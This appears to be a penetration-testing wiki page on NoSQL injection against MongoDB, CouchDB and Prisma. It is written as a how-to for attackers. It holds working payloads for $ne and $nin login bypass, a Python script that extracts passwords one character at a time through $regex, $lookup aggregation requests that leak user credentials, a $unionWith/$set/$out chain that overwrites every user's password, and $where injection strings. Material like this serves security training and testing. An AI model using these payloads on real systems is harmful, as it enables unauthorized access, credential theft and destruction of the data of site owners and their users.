---
description: >-
  NoSQL databases are a type of database where objects are used instead of SQL
  strings. MongoDB is common but more are vulnerable
---

# NoSQL Injection

While SQL Injection in the traditional sense may not be possible, there are still some new opportunities for vulnerabilities that NoSQL introduces in **MongoDB** (see [#similar-injections](nosql-injection.md#similar-injections "mention") for different databases). Mainly the ability for the user to specify their own objects in a request, which may make the NoSQL database interpret the request as more than just a string.

Often the goal is to bypass some login screen, by returning an always-true request. Sometimes you want to get more specific records or try to extract data.

## JSON Injection

Pretty often, especially in JavaScript backends, the server accepts JSON as data for API requests. The backend expects a certain simple format, like:

```json
{
  "username": "user",
  "password": "pass",
}
```

But in reality, an attacker can make the values of `username` or `password` any JSON object. This may have interesting results, and for NoSQL, you can create an object like the following:

```json
{
  "username": "admin",
  "password": {
    "$ne": "wrong"
  }
}
```

This creates a query that asks if the password is **not equal** to "wrong", with `$ne`. If there is then a user named "admin" with a different password, it will let you through and return the record of the "admin" user, bypassing the Login screen.&#x20;

### Forcing JSON

Most websites don't use JSON by default for requests, but some may still accept JSON data if you give it some. To change the content type of your POST data, you can add a `Content-Type` header:

```http
Content-Type: application/json
```

Then simply put JSON instead of URL parameters in your body, to see if the server still accepts the request with data in that format. If this works, you can try some NoSQL Injection as seen above.&#x20;

{% code title="Before (URL parameters)" %}
```php
username=user&password=pass
```
{% endcode %}

{% code title="After (JSON)" %}
```json
{
  "username": "user",
  "password": "pass"
}
```
{% endcode %}

To quickly do this in a proxy like Burp Suite, you can install this extension to easily convert your POST data into JSON, and add the correct header as well:

{% embed url="https://portswigger.net/bappstore/db57ecbe2cb7446292a94aa6181c9278" %}
Burp Suite extension to convert the content type of a request
{% endembed %}

## Injection in URL

While this JSON conversion sometimes works, it is not always accepted by the server. However, in **PHP** and possibly other frameworks there is another way to create arbitrary objects and inject NoSQL syntax:

```php
username=admin&password[$ne]=wrong
```

This example will create the following array in PHP, and might trip up NoSQL queries:

```php
array(2) {
  ["username"]=> string(4) "admin"
  ["password"]=> array(1) {
    ["$ne"]=> string(4) "wrong"
  }
}
```

## Extracting data

### Get other data

Often in a NoSQL injection, you are returning an always-true response to get through a login screen. This will return the first true record, which is likely always the first user created. But sometimes you want to log in as the second user, or any other user.&#x20;

To return specifically that user, you can provide a unique thing about that user if you know it, like a username, while keeping the password always true.&#x20;

If you don't know anything about other users, you can also simply exclude any user you don't want with the `$nin` (Not IN) keyword, and an array:

{% code title="URL parameters" %}
```php
username[$nin][]=admin&username[$nin][]=other&password[$ne]=wrong
```
{% endcode %}

{% code title="JSON" %}
```json
{
  "username": {
    "$nin": ["admin", "other"]
  },
  "password": {
    "$ne": "wrong"
  }
}
```
{% endcode %}

### RegEx Binary Search

Logging in does not regularly respond with the password for example that we made always true. This results in us being logged in, but not knowing the actual password, while it might still be useful to know this.&#x20;

A login action typically is a boolean response, resulting in a successful login, or an unsuccessful one. With the powerful NoSQL operators, we can abuse this feedback to slowly extract values from the query character by character, using `$regex`. The RegEx pattern will match if there is a password with that pattern, and fail if there is not.

This can be optimized by using [Binary Search](https://en.wikipedia.org/wiki/Binary_search_algorithm), an algorithm that allows you to cut in half the search space every time you ask a yes/no question. This makes finding any character in ASCII take only $$log_2(127) \approx 7$$ requests. See the following script for an example:

```python
# A function that returns True if the regex passes
def test_password(regex):
    data = {
        "username": "admin",
        "password": {
            "$regex": regex
        }
    }

    r = requests.post(URL, json=data, allow_redirects=False)

    return not 'Login Failed' in r.text

# Binary Search algorithm
def search_once(test_function, prefix=""):
    min = 0
    max = 127

    while min <= max:
        mid = (min + max) // 2

        if test_function(fr'^{re.escape(prefix)}[\x{mid:02x}-\x7f]'):
            min = mid + 1
        else:
            max = mid - 1

    return chr(max)

# Keep searching until whole string found
def search(test_function):
    found = ""
    while True:
        found += search_once(test_function, prefix=found)
        print(found)

        if test_function(fr'^{found}$'):
            return found

password = search(test_password)
print(password)
```

## Full injections

Sometimes, you may have a larger injection where you **control the whole query**. You can recognize this commonly by a [`$match`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/match/) key in your original input query that the application sends by itself. The server may have an API endpoint for easy querying of products:

```json
POST /api/products HTTP/1.1
Content-Type: application/json
...

[{
  "$match": {
    "instock": true
  }
}]
```

### Aggregate functions (`$match` -> `$lookup`)

The front end may always use the `$match` aggregation, but we as the attacker can use different keywords to perform different actions. A useful one is [`$lookup`](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) which performs a JOIN operation between two collections. This means the response JSON will include extra keys you define from another collection.&#x20;

The JOIN operation combines collections but does so conditionally. You need to provide one key from the original collection and one from the new collection. Where these keys are the same, all values of the new collection are added to the response. Often you want to do this with the `_id` key if the products are numbered 1,2,3... and your users are as well. Then every `n`th product will also include the `n`th user:

{% tabs %}
{% tab title="Request" %}
In this attack we try to fetch from the `users` collection where the product `_id` matches with the users `_id`

<pre class="language-json"><code class="lang-json">POST /api/products HTTP/1.1
Content-Type: application/json
...

[{
  "$lookup": {
<strong>    "from": "users",
</strong>    "localField": "_id",
    "foreignField": "_id",
    "as": "leak"
  }
}]
</code></pre>
{% endtab %}

{% tab title="Response" %}
<pre class="language-json"><code class="lang-json">HTTP/1.1 200 OK
...

[
  {
    "_id": 2,
    "name": "Second product",
    "price": "1.99",
    "instock": false,
<strong>    "leak": [{ "_id": 2, "username": "user", "password": "hunter2" }]
</strong>  },
  {
    "_id": 1,
    "name": "First product",
    "price": "2.99",
    "instock": true,
<strong>    "leak": [{ "_id": 1, "username": "admin", "password": "P@ssw0rd"}]
</strong>  }
]
</code></pre>

Notice the leak happens when the `_id` matches, because we set our `localField` and `foreignField` to this in the injection
{% endtab %}
{% endtabs %}

The above method requires the collections to have a key in common, which is not always the case. However, there is another more advanced method to JOIN on any condition, using the `"pipeline"` key. This allows you to write another custom query where you can match anything, like `_id` not being empty in the new collection. In the leak, it will now contain every document in the collection at once:

{% tabs %}
{% tab title="Request" %}
```json
POST /api/products HTTP/1.1
Content-Type: application/json
...

[{
  "$lookup": {
    "from": "users",
    "pipeline": [{ "$match": { "_id" : {"$ne": ""}  } }],
    "as": "leak"
  }
}]
```
{% endtab %}

{% tab title="Response" %}
```json
HTTP/1.1 200 OK
...

[
  {
    "_id": 4,
    "name": "Second product",
    "price": "1.99",
    "instock": false,
    "leak": [
      { "_id": 1, "username": "admin", "password": "P@ssw0rd" },
      { "_id": 2, "username": "user", "password": "hunter2" }
    ]
  },
  {
    "_id": 3,
    "name": "First product",
    "price": "2.99",
    "instock": true,
    "leak": [
      { "_id": 1, "username": "admin", "password": "P@ssw0rd" },
      { "_id": 2, "username": "user", "password": "hunter2" }
    ]
  }
]
```
{% endtab %}
{% endtabs %}

### Write data

You can do a lot with NoSQL Injection when you control the query. You might expect a `query` to only retrieve data, but with large enough control over the query you can actually alter collections and write them out to the database. By combining multiple operators we can do the following:

1. `$skip`: Get rid of any original response (`products`), to create an empty list
2. `$unionWith`: Add all documents from the `users` collection to the response
3. `$set`: Alter specific keys in the response, and write our data
4. `$out`: Write the response to a collection, overwriting all data

All of these combined into a payload will allow you to go from a `products` query, to overwriting any data in the `users` collection. You could for example set the `"password": "hacked"` for all users, including yourself:

```json
[
  {"$skip": 999},
  {"$unionWith": "users"},
  {"$set": {"password": "hacked"}},
  {"$out": "users"}
]
```

The above query will create an altered `users` collection and write it. Here is a step-by-step walkthrough of the response:

{% tabs %}
{% tab title="0. Start" %}
```json
[]
```

{% code title="Response" %}
```json
[
  {
    "_id": 2,
    "name": "Second product",
    "price": "1.99",
    "instock": false,
  },
  {
    "_id": 1,
    "name": "First product",
    "price": "2.99",
    "instock": true,
  }
]
```
{% endcode %}
{% endtab %}

{% tab title="1. $skip" %}
```json
  {"$skip": 999},
```

{% code title="Response" %}
```json
[]
```
{% endcode %}
{% endtab %}

{% tab title="2. $unionWith" %}
```json
  {"$unionWith": "users"},
```

{% code title="Response" %}
```json
[
  {
    "_id": 1,
    "username": "admin",
    "password": "P@ssw0rd"
  },
  {
    "_id": 2,
    "username": "user",
    "password": "hunter2"
  }
]
```
{% endcode %}
{% endtab %}

{% tab title="3. $set" %}
```json
  {"$set": {"role": "admin"}},
```

{% code title="Response" %}
```json
[
  {
    "_id": 1,
    "username": "admin",
    "password": "hacked"
  },
  {
    "_id": 2,
    "username": "user",
    "password": "hacked"
  }
]
```
{% endcode %}
{% endtab %}

{% tab title="4. $out" %}
```json
  {"$out": "users"}
```

Empty response, but the `users` collection is now saved as:

```json
[
  {
    "_id": 1,
    "username": "admin",
    "password": "hacked"
  },
  {
    "_id": 2,
    "username": "user",
    "password": "hacked"
  }
]
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
This can also be really useful in further attacks by inserting data some other system doesn't expect. Such as XSS, Insecure Deserialisation, or more injection attacks
{% endhint %}

## Filter Bypass

In most examples above, I used the `$ne` operator. But there are lots more ways to achieve an always-true result. For example:

```json
"$regex": ".*"  // Regular Expression
"$exists": true  // If any record exists
"$gt": "A"  // Greater than
"$lt": "z"  // Less than
```

## $where

MongoDB is a popular NoSQL framework, but sometimes still allows for a string injection like regular SQL Injection. Sometimes your input will end up in a `$where` clause with a condition similar to the following:

```javascript
`return (this.username == '${username}' && this.password == '${password}')`
```

In the same way as SQL Injection, you can make this condition always true by injecting one of the following in the `username` field:

```javascript
' || 1==1//
' || 1==1%00
```

Another simple way to make one statement true without many special characters:

```javascript
'=='
```

For more payloads for the same idea see [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads).

{% hint style="info" %}
**Note**: While it seems we are injecting into server-side JavaScript code, this language from MongoDB is very restricted and in modern versions does **not** have much use for attackers. However, in **very old** versions it might be possible to get [Remote Code Execution](https://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/) from this
{% endhint %}

## Similar Injections

With these ORM solutions becoming more popular, and developers forgetting it's possible to create object structures in most frameworks with your request, many different databases are vulnerable in a similar way. While NoSQL Injection on MongoDB is the most well-known, the idea of using operators like `$ne` or `$regex` are not exclusive to it, and might exist just with different names. be sure to check out the documentation if you are unsure.&#x20;

### Apache CouchDB

See the [Selector Syntax](https://docs.couchdb.org/en/stable/api/database/find.html#selector-syntax) for a full guide. Anywhere the `$` operators can be used just **like with MongoDB**, there is basically no difference in attacking:

{% code title="Login Bypass" %}
```json
{
  "username": "admin",
  "password": {
    "$ne": "wrong"
  }
}
```
{% endcode %}

{% code title="Regex Extraction" %}
```json
{
  "username": "admin",
  "password": {
    "$regex": "^a"
  }
}
```
{% endcode %}

### Prisma

See [Filter Conditions and Operators](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#filter-conditions-and-operators) for a full list. Similar to MongoDB, the common [Prisma](https://www.prisma.io/) ORM allows using operators anywhere in your query object. This can happen when you inject directly into the `where:` clause, which is very common:

<pre class="language-javascript" data-title="Vulnerable example"><code class="lang-javascript">app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const user = await prisma.user.findFirst({
<strong>    where: { email, password },
</strong>  });
</code></pre>

{% hint style="info" %}
**Note**: not all functions are vulnerable to this, because they don't all support operators. `findUnique()`, for example, is safe. Check out this article for more details on mitigations:

{% embed url="https://www.aikido.dev/blog/prisma-and-postgresql-vulnerable-to-nosql-injection#exploiting-operator-injection-in-prisma" %}
Explanation of the technique specific to Prisma and mitigations
{% endembed %}
{% endhint %}

As types in JavaScript are only a suggestion, developers need to explicitly validate their types to ensure attackers can't send objects though. If they can, it's possible to negate conditions just like MongoDB:

{% code title="Login Bypass" %}
```json
{
  "username": "admin",
  "password": {
    "not": "wrong"
  }
}
```
{% endcode %}

It's also possible to leak other potentially matching strings by iterating through prefixes:

{% code title="Char-by-char Extraction" %}
```json
{
  "username": "admin",
  "password": {
    "startsWith": "a"
  }
}
```
{% endcode %}

{% hint style="info" %}
You can get creative with [`OR`](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#or) and [`startsWith`](https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#startswith) operators to specify half of the possibilities like in [#regex-binary-search](nosql-injection.md#regex-binary-search "mention") to achieve the optimized performance again
{% endhint %}
